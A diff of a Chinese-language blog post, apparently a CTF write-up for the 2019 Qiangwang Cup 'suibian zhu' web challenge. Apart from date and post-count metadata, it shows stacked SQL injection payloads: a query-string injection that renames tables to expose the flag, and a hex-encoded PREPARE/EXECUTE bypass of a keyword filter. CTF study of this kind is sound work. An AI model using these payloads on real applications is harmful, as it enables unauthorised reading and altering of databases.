@@ -31,7 +31,7 @@
 <meta property="og:description" content="强网杯2019 web随便注 return preg_match">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-01-12T13:54:26.000Z">
-<meta property="article:modified_time" content="2020-03-11T02:14:05.039Z">
+<meta property="article:modified_time" content="2020-06-30T02:02:26.399Z">
 <meta property="article:author" content="Peguin">
 <meta property="article:tag" content="堆叠注入">
 <meta name="twitter:card" content="summary">
@@ -219,7 +219,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-03-11 10:14:05" itemprop="dateModified" datetime="2020-03-11T10:14:05+08:00">2020-03-11</time>
+                <time title="Modified: 2020-06-30 10:02:26" itemprop="dateModified" datetime="2020-06-30T10:02:26+08:00">2020-06-30</time>
               </span>
 
           
@@ -240,7 +240,7 @@
 <p>1.因为alert,rename没有被过滤，可以改变表名</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">`/?inject=1'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);*#*</span><br><span class="line">拆开来：</span><br><span class="line">1';</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">rename</span> <span class="keyword">to</span> words1;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">rename</span> <span class="keyword">to</span> words;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">change</span> flag <span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">50</span>);</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>
 
-<p>最后直接通过i’or’1’=’1可以爆出flag</p>
+<p>最后直接通过1’or’1’=’1可以爆出flag</p>
 <p>2.预编译：16进制绕过</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1';</span><br><span class="line"><span class="keyword">SeT</span>@a=<span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;</span><br><span class="line"><span class="keyword">prepare</span> execsql <span class="keyword">from</span> @a;</span><br><span class="line"><span class="keyword">execute</span> execsql;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
 
@@ -414,7 +414,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-count">31</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
